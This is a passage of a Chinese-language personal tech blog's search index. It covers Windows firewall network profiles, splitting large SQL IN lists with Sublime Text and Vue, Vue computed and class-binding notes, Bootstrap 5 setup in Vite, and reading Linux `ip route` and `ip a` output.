筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["Window"],"content":"我這台電腦 hfs 無法對外連線，有設定開通防火牆，一直找不出什麼問題。最近看了Docker Desktop for Windows 啟動的容器無法透過遠端連接的靈異事件簿 | The Will Will Web，嘗試著調整防火牆，別台電腦終於可以連了。 雖然保哥紀錄已經夠完整了，建議可以看上面文章，這邊還是紀錄我的筆記。 ","date":"2021-07-17","objectID":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/:0:0","tags":["window","firewall"],"title":"Window 防火牆設定完成無法連通的問題","uri":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Window"],"content":"了解 Window 私有網路/共用網路 什麼是私有網路/共用網路，共用網路在網路芳鄰不會被探索到。私有網路是在家裡讓網路芳鄰可以連到，這邊就不深入探索這些有什麼功能。 怎麼看現在網路用什麼位置? 使用 Powershell 看 Get-NetConnectionProfile Name : 網路 2 InterfaceAlias : nMatrix Virtual Network InterfaceIndex : 10 NetworkCategory : Public IPv4Connectivity : LocalNetwork IPv6Connectivity : NoTraffic Name : CHTXXX InterfaceAlias : 區域連線 InterfaceIndex : 29 NetworkCategory : Public IPv4Connectivity : Internet IPv6Connectivity : NoTraffic 這邊可以看到我是使用共用網路，所以網路芳鄰是找不到的。 上面保哥有特別說，正常在家會想分享網路芳鄰，可能就要開私有網路。在外面要連 Wifi 的話，可以使用共用網路，可以看情況選擇。 ","date":"2021-07-17","objectID":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/:1:0","tags":["window","firewall"],"title":"Window 防火牆設定完成無法連通的問題","uri":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Window"],"content":"切換共用網路/私有網路 # 私有網路 Set-NetConnectionProfile -Name \"CHTXXX\" -NetworkCategory Private # 共用網路 Set-NetConnectionProfile -Name \"CHTXXX\" -NetworkCategory Public 這邊假如你切換網路能跑了，但問題不是出在這邊，你可以往下在看下去是甚麼原因。 ","date":"2021-07-17","objectID":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/:1:1","tags":["window","firewall"],"title":"Window 防火牆設定完成無法連通的問題","uri":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Window"],"content":"了解防火牆 取消後發生的事情 一般第一次打開應用程式，如 hfs 會跳出防火牆圖示，如下。 我們按下「取消」，然後看到防火牆規則 竟然防火牆規則都是「封鎖」的(私有/共用網路)，然後你打開 hfs 軟體就無法選擇防火牆規則，因為都已經設定封鎖。 簡單做個這個防火牆會發生什麼事情 ","date":"2021-07-17","objectID":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/:2:0","tags":["window","firewall"],"title":"Window 防火牆設定完成無法連通的問題","uri":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Window"],"content":"最後整理 上面有那個選擇，就是對私有網路看共用網路做允許或封鎖設定。 假如你取消，就是私有網路、共用網路做封鎖。 假如你勾選私有網路，那就是私有網路做允許，共用網路做封鎖。 假如你勾選共用網路，那就是共用網路做允許，私有網路做封鎖。 假如全勾，就是私有網路、共用網路做允許。 ","date":"2021-07-17","objectID":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/:3:0","tags":["window","firewall"],"title":"Window 防火牆設定完成無法連通的問題","uri":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Window"],"content":"總結 首先，為什麼要知道當前網路是在私有網路/共用網路？因為在看防火牆規則才知道哪一個有效的。 再來就是看當前網路下，防火牆是否開通。 結案:D ","date":"2021-07-17","objectID":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/:4:0","tags":["window","firewall"],"title":"Window 防火牆設定完成無法連通的問題","uri":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Window"],"content":"指令小記 posershell 查詢防火牆規則 Get-NetFirewallRule | where { $_.Name -like \"*hfs*\" } | ft 開啟防火牆 cmd wf.msc ","date":"2021-07-17","objectID":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/:5:0","tags":["window","firewall"],"title":"Window 防火牆設定完成無法連通的問題","uri":"/blog/posts/Window-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["實用工具"],"content":"Oralce 有限制 Like 不能超過 1000 多筆。之前有寫過相關文章如下 寫程式使用 split 切割不會注意到的陷阱 | 程式狂想筆記 Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法 | 程式狂想筆記 但這些虛要手動處理太多，不能一次喝成，有時候資料量真的太大，只能分開查。最近想到 Sublime Text 方法，簡單做個記錄。 還是需要滿多步驟 ","date":"2021-07-14","objectID":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/:0:0","tags":["sublime","sql"],"title":"用 Sublime 分割 SQL 語句 LIKE 1000筆資料 語句","uri":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/"},{"categories":["實用工具"],"content":"DEMO 範例 '這是第 1 行', '這是第 2 行', '這是第 3 行', '這是第 4 行', 注意：上面有五行，因為 regex 需要多一行。 ","date":"2021-07-14","objectID":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/:1:0","tags":["sublime","sql"],"title":"用 Sublime 分割 SQL 語句 LIKE 1000筆資料 語句","uri":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/"},{"categories":["實用工具"],"content":"例外處理 假如框選最後一行，只框選一行。就要多做一個換行 如下： ","date":"2021-07-14","objectID":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/:1:1","tags":["sublime","sql"],"title":"用 Sublime 分割 SQL 語句 LIKE 1000筆資料 語句","uri":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/"},{"categories":["實用工具"],"content":"產生方法 在 Sublime 使用 regex ((.*\\n){1,3}) 選擇 Find all 按鈕 按 「Shift + 方向鍵左(←)」 後，再按「Shift + 方向鍵左(↑)」 Ctrl + J ，按完就完成兩段句子，最後一行可刪掉 複製兩段 LIKE SQL 語句，中間替代參數也要先設定 全部框選:id: Ctrl + D，把1,2行複製起來，貼上即可完成 把最後,移除 就可以快樂貼到編輯器查詢。 ","date":"2021-07-14","objectID":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/:2:0","tags":["sublime","sql"],"title":"用 Sublime 分割 SQL 語句 LIKE 1000筆資料 語句","uri":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/"},{"categories":["實用工具"],"content":"缺點 真的行數到超多筆的話，這個方法應該也沒辦法。 其實這個可以用程式寫，有空寫在補在這。 CodeSandbox 沒有認真寫 \u003ctemplate\u003e \u003cdiv class=\"hello\"\u003e \u003ctextarea v-model.lazy=\"item\" cols=\"30\" rows=\"10\"\u003e\u003c/textarea\u003e \u003ctextarea v-model.lazy=\"sql\" id=\"\" cols=\"30\" rows=\"10\"\u003e\u003c/textarea\u003e \u003c/div\u003e \u003cdiv\u003e \u003ctextarea v-model=\"result\" cols=\"30\" rows=\"10\" readonly\u003e\u003c/textarea\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import * as a from \"lodash\"; export default { name: \"HelloWorld\", data() { return { item: \"\", sql: \"\", }; }, method: { getDataDebounced() {}, }, created() { this.getDataDebounced = a.debounce(() =\u003e { let items = a.chunk( this.item.split(\"\\n\").filter((str) =\u003e str !== \"\"), 1000 ); console.log(items); items = items.map((a) =\u003e { a = a.map((str) =\u003e \"'\" + str + \"'\"); return a.join(\",\"); }); let r = \"\"; items.forEach((item) =\u003e { let aa = this.sql.replace(\"::id::\", item); console.log(aa); r += aa; r += \"\\n\"; }); console.log(r); this.result = r; console.log(this.result); }, 1000); }, computed: { result() { let items = a.chunk( this.item.split(\"\\n\").filter((str) =\u003e str !== \"\"), 1000 ); console.log(items); items = items.map((a) =\u003e { a = a.map((str) =\u003e \"'\" + str + \"'\"); return a.join(\",\"); }); let r = \"\"; items.forEach((item) =\u003e { let aa = this.sql.replace(\"::id::\", item); console.log(aa); r += aa; r += \"\\n\"; }); return r; }, }, }; \u003c/script\u003e \u003c!-- Add \"scoped\" attribute to limit CSS to this component only --\u003e \u003cstyle scoped\u003e h3 { margin: 40px 0 0; } ul { list-style-type: none; padding: 0; } li { display: inline-block; margin: 0 10px; } a { color: #42b983; } \u003c/style\u003e ","date":"2021-07-14","objectID":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/:3:0","tags":["sublime","sql"],"title":"用 Sublime 分割 SQL 語句 LIKE 1000筆資料 語句","uri":"/blog/posts/%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5/"},{"categories":["實用工具"],"content":"最近要做 SQL 語句 LIKE 超過 1000 筆，就無法執行。我想透過 Sublime Text 方式去做出來，還踩了一個雷。這個雷是這樣的，我框選 1000 筆(1筆含多行)，貼到我要貼得1000多行，結果貼上超過 1000 多筆資料。 當然簡單研究結果，找出到原因。原因很簡單，就是換行的問題 Sublime Text 和 vscode 都是一樣結果 ","date":"2021-07-14","objectID":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/:0:0","tags":["sublime","vscode","skill"],"title":"實驗 Sublime Text 和 vscode 框選多行貼上","uri":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/"},{"categories":["實用工具"],"content":"正規表達式抓到 多行方法 ((.*\\n){1,100}) 參考: sublimetext2 - multiple selection every N lines Sublime Text - Stack Overflow 稍微優化 (?:(.*\\n){1,100}) 參考:regex - What is a non-capturing group in regular expressions? - Stack Overflow ","date":"2021-07-14","objectID":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/:1:0","tags":["sublime","vscode","skill"],"title":"實驗 Sublime Text 和 vscode 框選多行貼上","uri":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/"},{"categories":["實用工具"],"content":"無法預期 這邊我們抓到資料 100 行資料貼到別的 100 列資料卻無法預期貼上結果。 我們框選內容 貼上結果 ","date":"2021-07-14","objectID":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/:1:1","tags":["sublime","vscode","skill"],"title":"實驗 Sublime Text 和 vscode 框選多行貼上","uri":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/"},{"categories":["實用工具"],"content":"原因 雖然Ctrl + D 框選資料可以包含換行，但是貼上分段式依照換行去變得。直接貼上我實驗的圖片 框選內容: 結果: 貼上結果前 貼上結果後 ","date":"2021-07-14","objectID":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/:1:2","tags":["sublime","vscode","skill"],"title":"實驗 Sublime Text 和 vscode 框選多行貼上","uri":"/blog/posts/%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A/"},{"categories":["Vue"],"content":"使用小記 前置 Vite 專案不寫了 ","date":"2021-07-14","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-Bootstrap-5/:0:0","tags":["vue","vite","boostrap"],"title":"Vite 使用 Bootstrap 5","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-Bootstrap-5/"},{"categories":["Vue"],"content":"安裝 Bootstrap 5 npm install bootstrap -D npm i @popperjs/core -D ","date":"2021-07-14","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-Bootstrap-5/:1:0","tags":["vue","vite","boostrap"],"title":"Vite 使用 Bootstrap 5","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-Bootstrap-5/"},{"categories":["Vue"],"content":"設定 main.js import \"bootstrap/dist/css/bootstrap.min.css\" import 'bootstrap' GIT: cf95a316b4a8fd73621040a135d41cfc304de780 完成 ","date":"2021-07-14","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-Bootstrap-5/:2:0","tags":["vue","vite","boostrap"],"title":"Vite 使用 Bootstrap 5","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-Bootstrap-5/"},{"categories":["Vue"],"content":" view 或者 methods 中有没有用到 pages，如果没有用到，那么是不会触发 computed 的 【VUE】当依赖属性改变时，computed为何没有被触发? - SegmentFault 思否 那些關於 Vue 的小細節 - Computed 中 getter 和 setter 觸發的時間點 ~ PJCHENder 那些沒告訴你的小細節這篇詳細講了 getter 和 setter 實作，簡單來說 view 或 methods執行 沒有用到 computed 的屬性，就不會執行 getter 資料，所以就無法執行! 因為這篇採雷了，也許我們要分析什麼時候用到 computed。我剛好用 monaco-editor ，此套件沒有用到 Vue 程式，所以沒辦法用到 data Binding 去做綁定，但是我用 Event 去觸發改 Vue 的值，也許應該要獨立把它包成 Vue 套件。目前 Vue3 測試階段，套件沒有支援 Vue3。 仔細回去看官網那篇文件计算属性和侦听器 | Vue.js，真的是用在 View 的值，我當初以為 computed 裡面屬性裡面的值是因為偵測 function 裡面變數，但看來是我想太多，原理就是 getter。 這篇就記錄到這邊，因為這麼簡單原理，我卡了幾小時的關，不過最後也還債了… 小記: 想使用外部存js 元件有甚麼方法? 我這邊自己想的方向有: 寫在 method 直接觸發 function data binding ","date":"2021-07-14","objectID":"/blog/posts/vue-computed-%E7%84%A1%E6%B3%95%E8%A7%B8%E7%99%BC%E5%8E%9F%E5%9B%A0/:0:0","tags":["vue"],"title":"Vue computed 無法觸發原因","uri":"/blog/posts/vue-computed-%E7%84%A1%E6%B3%95%E8%A7%B8%E7%99%BC%E5%8E%9F%E5%9B%A0/"},{"categories":["Vue"],"content":"在使用 Bootstrap 會用到 Navbar 選單，做到動態選單時候會用到 isActive，要怎麼透過 Vue 綁定到 class 上面?照官方實作可以簡單完成。 ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:0:0","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"需求解法 \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link\" :class=\"{active: mode === 'edit'}\" aria-current=\"page\" href=\"javascript:;\" @click=\"mode = 'edit'\"\u003e編輯\u003c/a\u003e \u003c/li\u003e \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link\" :class=\"{active: mode === 'result'}\" href=\"javascript:;\" @click=\"mode = 'result'\"\u003e結果\u003c/a\u003e \u003c/li\u003e export default { data(){ return { mode: 'edit', } }, ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:1:0","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"綁定 HTML Class ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:2:0","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"物件語法 \u003cdiv :class=\"{ active: isActive }\"\u003e\u003c/div\u003e ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:2:1","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"靜態與動態 Class 結合 \u003cdiv class=\"static\" :class=\"{ active: isActive, 'text-danger': hasError }\" \u003e\u003c/div\u003e data() { return { isActive: true, hasError: false } } 結果 \u003cdiv class=\"static active\"\u003e\u003c/div\u003e ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:3:0","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"搭配 computed \u003cdiv :class=\"classObject\"\u003e\u003c/div\u003e data() { return { isActive: true, error: null } }, computed: { classObject() { return { active: this.isActive \u0026\u0026 !this.error, 'text-danger': this.error \u0026\u0026 this.error.type === 'fatal' } } } ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:3:1","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"陣列語法 \u003cdiv :class=\"[activeClass, errorClass]\"\u003e\u003c/div\u003e data() { return { activeClass: 'active', errorClass: 'text-danger' } } result: \u003cdiv class=\"active text-danger\"\u003e\u003c/div\u003e ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:4:0","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"在組件上使用 還滿特別的，建議去看官方文件範例:Class 与 Style 绑定 - 在組件上使用 | Vue.js ","date":"2021-07-14","objectID":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/:5:0","tags":["vue"],"title":"Vue 使用綁定 class  筆記","uri":"/blog/posts/Vue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"之前寫一張網卡使用多組 IP 方法 - 使用上設定防火牆陷阱 | 程式狂想筆記有談過使用上設定防火牆陷阱，彈要怎麼看出去方法ip route show，但我對輸出出來資訊不太懂，今天特別研究一下。 ","date":"2021-07-14","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/:0:0","tags":["network","ip","route"],"title":"查看 IP 指令和路由筆記","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"ip 詳細指令 linux IP命令简介 - 簡書 備份圖 我找出介紹詳細指令簡介，建議可以看一下，相關問題可以解決。 ","date":"2021-07-14","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/:1:0","tags":["network","ip","route"],"title":"查看 IP 指令和路由筆記","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"所以要怎麼看出去 ip? ","date":"2021-07-14","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/:2:0","tags":["network","ip","route"],"title":"查看 IP 指令和路由筆記","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"ip route show #ip route show default via 10.0.2.2 dev enp0s3 proto dhcp metric 100 default via 192.168.99.1 dev enp0s8 proto static metric 101 10.0.2.0/24 dev enp0s3 proto kernel scope link src 10.0.2.15 metric 100 10.244.0.0/24 via 10.244.0.0 dev flannel.1 onlink 10.244.1.0/24 dev cni0 proto kernel scope link src 10.244.1.1 10.244.2.0/24 via 10.244.2.0 dev flannel.1 onlink 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 192.168.99.0/24 dev enp0s8 proto kernel scope link src 192.168.99.111 metric 101 default表示默認的route，即其他route規則沒有生效就默認使用該條規則。兩條default規則分別對應不同的device。 dev表示device，即使用的interface是哪個 proto表示該條規則的protocol identifier，有： redirect，該路由是由於ICMP redirect產生(install) kernel，該路由是在內核進行自動配置的時候產生的 boot，該路由是在bootup的時候產生 static，該路由是由管理員增加的，為了覆蓋動態路由 ra，該路由由Router Discovery tool產生 scope，同上面ip addr show介紹的scope src，表示為優先選擇的源地址，當給目標地址發包的時候 metric，表示到目的地的距離(the ‘distance’ to the target)，是一個數字，其單位可以是：Hop, Delay, Throughput, Reliability 參考來源: linux IP命令简介 - 簡書 通俗理解IP路由 - SegmentFault 思否 其實我還是覺得這樣還是很不方便看，route指令可以看到那些外部 IP 會倒哪個 Gateway。後面也會講 route 指令也被廢棄了… 這邊也可以設定一個固定 IP 會指定至到哪一個 Gateway，設定結果如下。 10.88.22.11 via 172.26.15.254 dev eth1 10.88.22.12 via 172.26.15.254 dev eth1 10.88.22.13 via 172.26.15.254 dev eth1 這邊我觀查 via 後面是放 Gateway IP，前面是目標 IP 會指定一個 Gateway 傳出去。程式寫太久，再回來看真的會忘記… 小記看 ip route 技巧 default via 10.89.8.254 dev eth0 10.88.22.11 via 172.26.15.254 dev eth1 10.88.22.12 via 172.26.15.254 dev eth1 10.88.22.13 via 172.26.15.254 dev eth1 10.89.8.0/24 dev eth0 proto kernel scope link src 10.89.8.88 169.254.0.0/16 dev eth2 scope link metric 1004 169.254.0.0/16 dev eth1 scope link metric 1005 169.254.0.0/16 dev eth0 scope link metric 1006 172.26.15.0/24 dev eth1 proto kernel scope link src 172.26.15.30 172.26.25.0/24 dev eth2 proto kernel scope link src 172.26.25.100 步驟 尋找目標 IP 對應上面 via 關鍵字搜尋會指定到哪一個 Gateway ，沒有的話就看 default Gateway 尋找 Gatway IP 範圍，如:10.89.8.254 =\u003e 10.89.8.0/24 找出那一行的 src 10.89.8.88 src，表示為優先選擇的源地址，當給目標地址發包的時候 ","date":"2021-07-14","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/:2:1","tags":["network","ip","route"],"title":"查看 IP 指令和路由筆記","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"ip a 我覺得 ip route show 比較難第一時間看出來，在想有什麼關鍵字可以看結果。 linux IP命令简介 - 簡書裡面有提到secondary當為外發的網絡包選擇默認源地址時不使用該地址 secondary，當為外發的網絡包選擇默認源地址時不使用該地址 這樣來看確實可以馬上看出來，不過 ifconfig 沒有看到相關資訊。 # ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever .... 6: eth0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff inet 10.89.8.88/24 brd 10.89.8.255 scope global eth0 valid_lft forever preferred_lft forever inet 10.89.8.103/24 brd 10.89.8.255 scope global secondary eth0:103 valid_lft forever preferred_lft forever inet 10.89.8.104/24 brd 10.89.8.255 scope global secondary eth0:104 valid_lft forever preferred_lft forever inet 10.89.8.105/24 brd 10.89.8.255 scope global secondary eth0:105 valid_lft forever preferred_lft forever inet 10.89.8.106/24 brd 10.89.8.255 scope global secondary eth0:106 valid_lft forever preferred_lft forever inet 10.89.8.107/24 brd 10.89.8.255 scope global secondary eth0:107 valid_lft forever preferred_lft forever inet 10.89.8.108/24 brd 10.89.8.255 scope global secondary eth0:108 valid_lft forever preferred_lft forever inet 10.89.8.109/24 brd 10.89.8.255 scope global secondary eth0:109 valid_lft forever 